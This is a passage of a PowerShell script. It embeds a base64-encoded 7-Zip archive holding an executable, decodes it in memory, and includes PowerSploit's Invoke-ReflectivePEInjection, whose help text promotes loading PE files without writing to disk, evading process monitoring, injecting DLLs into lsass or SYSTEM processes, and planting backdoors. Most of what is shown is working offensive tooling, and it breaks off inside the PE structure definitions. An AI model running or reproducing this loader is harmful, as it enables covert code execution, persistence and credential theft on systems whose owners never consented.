kFh6g9AkZ+N3j8fEr7aqcg+Ys5A/YdqDRl/B+fo+/bTXRlWcfRX0MhK7Wj1gmC2/o3YYIhtvj25Nr40kK23HXo1GoES/TyJeo7b8SCBYZ2CU3odisv2qPQBA
nVstaYdAmu9rxX5PiboMV+U41TSEU5yfrJs4YEyjZV/673CnozyCFncmIo6xHj02QQf/UDsHXURZ8NcEmcgehWASqwke6jLmZsJfXbJUiuRCTv5Mhcg5nDT2
usAzwi5qE6S7f629iot8Dz6V7M/TzFtCB+5K/29A5TO6OZUiJu1C/x3ygu+DnG3rkWC6e0Q2nFwQjgqkYTMaDDY+qnk7xHCPyFQ0KZPDnW70Q5nLNZJTAi6J
YRVwc4XetWlo7Lh45TV321vAXawIgbuaVXm2FAAAYCN6jHQ2SNTTe3MOrgqW3Bq/ZDg/B0m6xCFd0RI5+aDMG1DNwotatLUxVsAd7TvlFC9GDkO05xD4okvQ
CpJkZ8lL1619bo3MCvFY919ZXLPSEx3rna2PSHnQHfwn2mBCEtSTNnT89dJt9cF7hrh7aCn4QonE1FNWxAAlrSOQ/INBXYtD/3S0+8EXUY8Qz91dPz4AXL6c
jdMAkSzvDmuxJPVvynwMF6bqpBiAYfjEBQQf5nEhMo6tkFmHzg88kBZN6hzWXDxJtN+e3A+swRSV/1ee90Djys0hNuE7idOf9Zg7CRqKnhCnuAgUlXN1TSmv
xH6snivnX/jESCcwoW3YygMN3xnXWEX1ePTfk+1/nJIqVSw0bnlUUTsha3WMcp8PQ3EYLZU1vx2czPMXM9yWXCs4+HQn+ytiu2SCbARAYRilRIoUWIlRceZo
InwGzpn9b941FqoBu7jwb74LQU/l94epqf0jzCIoYTaAqFB5mioBTDn+XNxBNzSGbQKzbwOt8ueOytwckoZ5jdfnhQznyEqRAlkWDcb+p6woJCPI+hrIusc1
4j+DqeqGKmMm2Q7dEHW8Ux42dnT39LwXaC5R7FSgPJyt1t6A8idBI9VmGoNq9k7viqkNHGgSh/ta8fgyPRAONYFGfG0R8bz+o27O8tskgua2C30jTVv7EWNK
BW/EDv4QFC2aC1mdCBJmn6dheiMP56VHEr9Pd68+sVh8nmODkycV9RgxJjFl0qpOJL+CRnk6jVnxF1wfvEZNZ6F/Vcpovv65Ji7nHdQJC2DDEEU8mKFDWOwd
6khCQ3vI161VWipoQSKMeoZ8fiWUcpPR8WoQlGDrvBXv5lTAcdxLR0TKP1d4DbOIINpUJ92ndXweSvIkB4EsCOqeOxmLHhow1Yi8mne2li0MqMuDRDiolBS2
c5MhpgUZcmrfXm5d43+9kelp9BWvb4jKiwbRwF9j17yzd5+BzeAlB12YumZNK6QUiqwjyYXH9jAAhtVwlkFN+Z38bXxXkS7XjpQHWmYeLrJGVnroPO0pxbxd
hs3BggUIJ/8+aYR15O0gDjSfPbZJzygxZFPb7sA/lEF3c0i9iQLlmn7ao+YlkNQP7qzKzGAlEBMiBf7xSpcUS41VHu9+Ex8x1mIu2K58lz/mxx3Qat2Sc0Ex
IQzegG+sHtFej87Chk97CaIjS7MqJorTjpeACHDwjItGP0Aq7Lg4Aqql/Jvm9bKkL6z1Kz5aE62kETK96El8LCfh3we7z8C718nxV0sbdNy/yo/ZInVk/EZM
ztNzNLE4un67IHJ5uLa4p+8zFcc7LM2MwAG8O0wBwaFzJuCIiDf9I4/v5IFVrsPzPwABBAYABAnAHL59hTWD9AAHCwEABCMDAQEFbAAABgAjAwEBBWwAAAYA
IwMBAQVdAAAGABQDAwEbBAEFAAQBAwICBgEADIvgkVzExNbEAPQACAoB8DFyTQAABQEZAQARMQB2AGsAYwB1AGIAZQBfAHMAZQBsAGYAYwBvAG0AcABpAGwA
ZQBkAC4AZQB4AGUAAAAZAgAAFAoBAGlGMudpLdkBFQYBACAAAAAAAA==
'
#https://superuser.com/questions/1506991/download-and-extract-archive-using-powershell
#[System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression')
#    $result=Invoke-WebRequest -Uri 'https://ffmpeg.zeranoe.com/builds/win64/static/ffmpeg-20200424-a501947-win64-static.zip' -Method Get -SslProtocol Tls12
#
#    $result = [System.Convert]::FromBase64String($CompressedString)

#    $zipStream = New-Object System.IO.Memorystream
#    $zipStream.Write($result,0,$result.Length)
#    $zipFile = [System.IO.Compression.ZipArchive]::new($zipStream)
#    OK, what did I just download?
#    Write the contents to the shell output
#    $zipFile.Entries | Select-Object -ExcludeProperty @('Archive','ExternalAttributes') | Format-Table #I don't care about 'Archive' or 'ExternalAttributes', so I instruct suppress those
#    I see there is 'ffmpeg-20200424-a501947-win64-static/bin/ffmpeg.exe' entry
#    $zipEntry = $zipFile.GetEntry('doom2/gzdoom.exe')
#    $binReader = [System.IO.BinaryReader]::new($zipEntry.Open())
#    $PEBytes= $binReader.ReadBytes($zipEntry.Length)
#    need external modules `PowerShellMafia/PowerSploit` to be able to run exe from memory (without writing to disk); see comments below this code block
#    Invoke-ReflectivePEInjection -PEBytes $binReader.ReadByte() -ExeArgs "Arg1 Arg2 Arg3 Arg4"


Add-Type -path $env:systemroot\system32\WindowsPowerShell\v1.0\SevenZipExtractor.dll

$result = [System.Convert]::FromBase64String($CompressedString)

$zipStream = [System.IO.MemoryStream]::new(($result))
$szExtractor = New-Object -TypeName SevenZipExtractor.ArchiveFile -ArgumentList @($zipStream, 'sevenzip')

foreach ($entry in $szExtractor.Entries) {
    $memStream = [System.IO.MemoryStream]::new()

    $entry.Extract($memStream);
    $PEBytes=  $memstream.ToArray()
}

#    $szExtractor.Extract("$env:TEMP",$False) # Instead of $env:TEMP, wherever you want the files to go


#PSGzip decompression
#$data = [System.Convert]::FromBase64String($CompressedString)
#$ms = New-Object System.IO.MemoryStream
#$ms.Write($data, 0, $data.Length)
#$ms.Seek(0,0) | Out-Null
#$sr = New-Object System.IO.StreamReader(New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress))
#$InputString = $sr.ReadToEnd()

function Invoke-ReflectivePEInjection
{
<#
.SYNOPSIS

This script has two modes. It can reflectively load a DLL/EXE in to the PowerShell process,
or it can reflectively load a DLL in to a remote process. These modes have different parameters and constraints,
please lead the Notes section (GENERAL NOTES) for information on how to use them.

1.)Reflectively loads a DLL or EXE in to memory of the Powershell process.
Because the DLL/EXE is loaded reflectively, it is not displayed when tools are used to list the DLLs of a running process.

This tool can be run on remote servers by supplying a local Windows PE file (DLL/EXE) to load in to memory on the remote system,
this will load and execute the DLL/EXE in to memory without writing any files to disk.

2.) Reflectively load a DLL in to memory of a remote process.
As mentioned above, the DLL being reflectively loaded won't be displayed when tools are used to list DLLs of the running remote process.

This is probably most useful for injecting backdoors in SYSTEM processes in Session0. Currently, you cannot retrieve output
from the DLL. The script doesn't wait for the DLL to complete execution, and doesn't make any effort to cleanup memory in the
remote process.

PowerSploit Function: Invoke-ReflectivePEInjection
Author: Joe Bialek, Twitter: @JosephBialek
Code review and modifications: Matt Graeber, Twitter: @mattifestation
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Reflectively loads a Windows PE file (DLL/EXE) in to the powershell process, or reflectively injects a DLL in to a remote process.

.PARAMETER PEBytes

A byte array containing a DLL/EXE to load and execute.

.PARAMETER ComputerName

Optional, an array of computernames to run the script on.

.PARAMETER FuncReturnType

Optional, the return type of the function being called in the DLL. Default: Void
    Options: String, WString, Void. See notes for more information.
    IMPORTANT: For DLLs being loaded remotely, only Void is supported.
    
.PARAMETER ExeArgs

Optional, arguments to pass to the executable being reflectively loaded.
    
.PARAMETER ProcName

Optional, the name of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.

.PARAMETER ProcId

Optional, the process ID of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.

.PARAMETER ForceASLR

Optional, will force the use of ASLR on the PE being loaded even if the PE indicates it doesn't support ASLR. Some PE's will work with ASLR even
    if the compiler flags don't indicate they support it. Other PE's will simply crash. Make sure to test this prior to using. Has no effect when
    loading in to a remote process.

.PARAMETER DoNotZeroMZ

Optional, will not wipe the MZ from the first two bytes of the PE. This is to be used primarily for testing purposes and to enable loading the same PE with Invoke-ReflectivePEInjection more than once.
    
.EXAMPLE

Load DemoDLL and run the exported function WStringFunc on Target.local, print the wchar_t* returned by WStringFunc().
$PEBytes = [IO.File]::ReadAllBytes('DemoDLL.dll')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType WString -ComputerName Target.local

.EXAMPLE

Load DemoDLL and run the exported function WStringFunc on all computers in the file targetlist.txt. Print
    the wchar_t* returned by WStringFunc() from all the computers.
$PEBytes = [IO.File]::ReadAllBytes('DemoDLL.dll')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType WString -ComputerName (Get-Content targetlist.txt)

.EXAMPLE

Load DemoEXE and run it locally.
$PEBytes = [IO.File]::ReadAllBytes('DemoEXE.exe')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4"

.EXAMPLE

Load DemoEXE and run it locally. Forces ASLR on for the EXE.
$PEBytes = [IO.File]::ReadAllBytes('DemoEXE.exe')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4" -ForceASLR

.EXAMPLE

Refectively load DemoDLL_RemoteProcess.dll in to the lsass process on a remote computer.
$PEBytes = [IO.File]::ReadAllBytes('DemoDLL_RemoteProcess.dll')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcName lsass -ComputerName Target.Local

.NOTES
GENERAL NOTES:
The script has 3 basic sets of functionality:
1.) Reflectively load a DLL in to the PowerShell process
    -Can return DLL output to user when run remotely or locally.
    -Cleans up memory in the PS process once the DLL finishes executing.
    -Great for running pentest tools on remote computers without triggering process monitoring alerts.
    -By default, takes 3 function names, see below (DLL LOADING NOTES) for more info.
2.) Reflectively load an EXE in to the PowerShell process.
    -Can NOT return EXE output to user when run remotely. If remote output is needed, you must use a DLL. CAN return EXE output if run locally.
    -Cleans up memory in the PS process once the DLL finishes executing.
    -Great for running existing pentest tools which are EXE's without triggering process monitoring alerts.
3.) Reflectively inject a DLL in to a remote process.
    -Can NOT return DLL output to the user when run remotely OR locally.
    -Does NOT clean up memory in the remote process if/when DLL finishes execution.
    -Great for planting backdoor on a system by injecting backdoor DLL in to another processes memory.
    -Expects the DLL to have this function: void VoidFunc(). This is the function that will be called after the DLL is loaded.

DLL LOADING NOTES:

PowerShell does not capture an applications output if it is output using stdout, which is how Windows console apps output.
If you need to get back the output from the PE file you are loading on remote computers, you must compile the PE file as a DLL, and have the DLL
return a char* or wchar_t*, which PowerShell can take and read the output from. Anything output from stdout which is run using powershell
remoting will not be returned to you. If you just run the PowerShell script locally, you WILL be able to see the stdout output from
applications because it will just appear in the console window. The limitation only applies when using PowerShell remoting.

For DLL Loading:
Once this script loads the DLL, it calls a function in the DLL. There is a section near the bottom labeled "YOUR CODE GOES HERE"
I recommend your DLL take no parameters. I have prewritten code to handle functions which take no parameters are return
the following types: char*, wchar_t*, and void. If the function returns char* or wchar_t* the script will output the
returned data. The FuncReturnType parameter can be used to specify which return type to use. The mapping is as follows:
wchar_t* : FuncReturnType = WString
char* : FuncReturnType = String
void : Default, don't supply a FuncReturnType

For the whcar_t* and char_t* options to work, you must allocate the string to the heap. Don't simply convert a string
using string.c_str() because it will be allocaed on the stack and be destroyed when the DLL returns.

The function name expected in the DLL for the prewritten FuncReturnType's is as follows:
WString : WStringFunc
String : StringFunc
Void : VoidFunc

These function names ARE case sensitive. To create an exported DLL function for the wstring type, the function would
be declared as follows:
extern "C" __declspec( dllexport ) wchar_t* WStringFunc()


If you want to use a DLL which returns a different data type, or which takes parameters, you will need to modify
this script to accomodate this. You can find the code to modify in the section labeled "YOUR CODE GOES HERE".

Find a DemoDLL at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectiveDllInjection

.LINK

http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/

Blog on modifying mimikatz for reflective loading: http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
Blog on using this script as a backdoor with SQL server: http://www.casaba.com/blog/
#>

[CmdletBinding()]
Param(
    [Parameter(Position = 0, Mandatory = $true)]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $PEBytes,
    
    [Parameter(Position = 1)]
    [String[]]
    $ComputerName,
    
    [Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void' )]
    [String]
    $FuncReturnType = 'Void',
    
    [Parameter(Position = 3)]
    [String]
    $ExeArgs,
    
    [Parameter(Position = 4)]
    [Int32]
    $ProcId,
    
    [Parameter(Position = 5)]
    [String]
    $ProcName,

    [Switch]
    $ForceASLR,

    [Switch]
    $DoNotZeroMZ
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $FuncReturnType,
                
        [Parameter(Position = 2, Mandatory = $true)]
        [Int32]
        $ProcId,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $ProcName,

        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ForceASLR
    )
    
    ###################################
    ########## Win32 Stuff ##########
    ###################################
    Function Get-Win32Types
    {
        $Win32Types = New-Object System.Object

        #Define all the structures/enums that will be used
        # This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
        $Domain = [AppDomain]::CurrentDomain
        $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
        ################################################################################################
        #                              ADAPTED TO PS7	                                               #
        ################################################################################################
        $AssemblyBuilder = [System.Reflection.Emit.AssemblyBuilder]::DefineDynamicAssembly($DynamicAssembly, 'Run')
        # $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        ################################################################################################
        #                              END ADAPTED TO PS7	                                       #
        ################################################################################################
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
        $ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


        ############ ENUM ############
        #Enum MachineType
        $TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
        $TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
        $TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
        $TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
        $MachineType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

        #Enum MagicType
        $TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
        $MagicType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

        #Enum SubSystemType
        $TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
        $SubSystemType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

        #Enum DllCharacteristicsType
        $TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
        $TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
        $TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
        $TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
        $TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
        $DllCharacteristicsType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

        ########### STRUCT ###########
        #Struct IMAGE_DATA_DIRECTORY
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
        ($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
        $IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

        #Struct IMAGE_FILE_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
        $TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
        $IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

        #Struct IMAGE_OPTIONAL_HEADER64
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
        $IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

        #Struct IMAGE_OPTIONAL_HEADER32
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
